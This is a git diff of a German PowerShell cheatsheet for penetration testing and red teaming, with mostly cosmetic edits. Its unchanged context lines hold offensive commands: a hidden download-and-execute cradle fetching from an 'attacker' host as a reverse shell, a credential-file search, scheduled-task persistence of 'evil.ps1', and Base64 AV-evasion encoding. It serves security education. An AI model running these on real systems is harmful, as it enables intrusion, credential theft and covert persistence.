@@ -1,18 +1,18 @@
 # ⚡ PowerShell Cheatsheet for Cybersecurity & Offensive Ops
 
-## 📘 Ziel dieser Datei
+## Ziel dieser Datei
 
 Dieses Cheatsheet bietet eine schnelle Referenz für den **Einsatz von PowerShell** in Penetration Tests, Incident Response, Red Teaming und OSINT. Es enthält **sicherheitsrelevante, administrative und offensive Befehle**, gegliedert nach Szenarien.
 
-> 🛡️ Hinweis: PowerShell ist ein äußerst mächtiges Werkzeug – bitte **nur in autorisierten Umgebungen** einsetzen!
+> Hinweis: PowerShell ist ein äußerst mächtiges Werkzeug – bitte **nur in autorisierten Umgebungen** einsetzen!
 
 ---
 
-## 🧭 Inhaltsverzeichnis
+## Inhaltsverzeichnis
 
 - [Systeminformationen](#systeminformationen)
 - [Benutzer & Gruppen](#benutzer--gruppen)
-- [Netzwerk- & Firewallinfos](#netzwerk--firewallinfos)
+- [Netzwerk- & Firewallinfos](#netzwerk---firewallinfos)
 - [Dateisystem und Suche](#dateisystem-und-suche)
 - [Prozesse & Dienste](#prozesse--dienste)
 - [PowerShell Execution Policies](#execution-policies--umgehung)
@@ -22,10 +22,12 @@ Dieses Cheatsheet bietet eine schnelle Referenz für den **Einsatz von PowerShel
 - [Persistenz via PowerShell](#persistenz-via-powershell)
 - [Antivirus Evasion](#av-evasion-basics)
 - [Nützliche Tools](#nützliche-module--projekte)
+- [Verknüpfte Dateien im Repository](#verknüpfte-dateien-im-repository)
+- [Haftungsausschluss](#haftungsausschluss)
 
 ---
 
-## 🖥️ Systeminformationen
+## Systeminformationen
 
 ```powershell
 Get-ComputerInfo
@@ -36,7 +38,7 @@ Get-WmiObject -Class Win32_OperatingSystem
 
 ---
 
-## 👤 Benutzer & Gruppen
+## Benutzer & Gruppen
 ```powershell
 whoami /all
 Get-LocalUser
@@ -47,7 +49,13 @@ Get-LocalGroupMember -Group "Administrators"
 
 ---
 
-## 🌐 Netzwerk- & Firewallinfos
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Netzwerk- & Firewallinfos
 
 ```powershell
 ipconfig /all
@@ -60,7 +68,7 @@ Test-NetConnection -ComputerName <IP> -Port <Port>
 
 ---
 
-## 📂 Dateisystem und Suche
+## Dateisystem und Suche
 
 ```powershell
 Get-ChildItem -Recurse -Filter *.ps1
@@ -70,7 +78,7 @@ Get-Content C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadl
 
 ---
 
-## 🔧 Prozesse & Dienste
+## Prozesse & Dienste
 
 ```powershell
 Get-Process
@@ -81,7 +89,7 @@ Get-WmiObject win32_service | Where { $_.State -eq "Running" }
 
 ---
 
-## 🚧 Execution Policies & Umgehung
+## Execution Policies & Umgehung
 
 ```powershell
 Get-ExecutionPolicy
@@ -91,14 +99,20 @@ powershell.exe -ExecutionPolicy Bypass -File script.ps1
 
 ---
 
-## 📥 Download & Remote Access
-### 🔻 Datei herunterladen
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Download & Remote Access
+### Datei herunterladen
 
 ```powershell
 Invoke-WebRequest "http://ip/script.ps1" -OutFile "script.ps1"
 ```
 
-### 💻 Remote Shell (reverse)
+### Remote Shell (reverse)
 
 ```powershell
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker/nc.ps1')
@@ -106,27 +120,27 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command IEX(New-Object Net.WebClie
 
 ---
 
-## 🔎 PowerShell Recon & Enum
+## PowerShell Recon & Enum
 
-### 🔐 Passwort-Reste / Credentials
+### Passwort-Reste / Credentials
 
 ```powershell
 Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include *pass*,*cred*,*vnc* | Select-String -Pattern "password"
 ```
 
-### 🧠 Benutzerkontext
+### Benutzerkontext
 
 ```powershell
 Get-CimInstance Win32_LoggedOnUser
 ```
 
-### 🗄️ Scheduled Tasks
+### Scheduled Tasks
 
 ```powershell
 Get-ScheduledTask | Where-Object {$_.TaskPath -like "*"}
 ```
 
-## 💣 PowerShell für Angreifer
+## PowerShell für Angreifer
 
 | Tool                      | Beschreibung                             |
 | ------------------------- | ---------------------------------------- |
@@ -139,7 +153,13 @@ Get-ScheduledTask | Where-Object {$_.TaskPath -like "*"}
 
 --- 
 
-## 📌 Persistenz via PowerShell
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Persistenz via PowerShell
 ```powershell
 # Persistenz per Scheduled Task
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\evil.ps1"
@@ -149,7 +169,7 @@ Register-ScheduledTask -TaskName "Updater" -Action $action -Trigger $trigger
 
 --- 
 
-## 🧪 AV-Evasion Basics (nur zu Lernzwecken!)
+## AV-Evasion Basics (nur zu Lernzwecken!)
 ```powershell
 # Base64-Encoding Payloads
 $bytes = [System.Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://<ip>/payload.ps1')")
@@ -159,7 +179,7 @@ powershell -EncodedCommand $encoded
 
 ---
 
-## 🔌 Nützliche Module & Projekte
+## Nützliche Module & Projekte
 
 | Tool / Modul   | Link                                                                                                                                     |
 | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
@@ -171,14 +191,14 @@ powershell -EncodedCommand $encoded
 
 ---
 
-## 📁 Verknüpfte Dateien im Repository
+## Verknüpfte Dateien im Repository
 - [windows_privilege_escalation.md](/04-os-enumeration/windows_privilege_escalation.md)
 - [linux_privilege_escalation.md](/04-os-enumeration/linux_privilege_escalation.md)
 - [red_team_tools.md](/05-red-teaming/red_team_tools.md)
 
 ---
 
-## ⚠️ Haftungsausschluss
+## Haftungsausschluss
 
 Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.
 
@@ -187,12 +207,19 @@ Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisi
 Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
 Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.
 
+[Disclaimer](/00-disclaimer/disclaimer.md)
+
 --- 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 Stay curious – stay secure. 🔐
 
-🗓️ **Letzte Aktualisierung:** Juli 2025  
+🗓️ **Letzte Aktualisierung:** August 2025  
 🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!
 
 ---
-
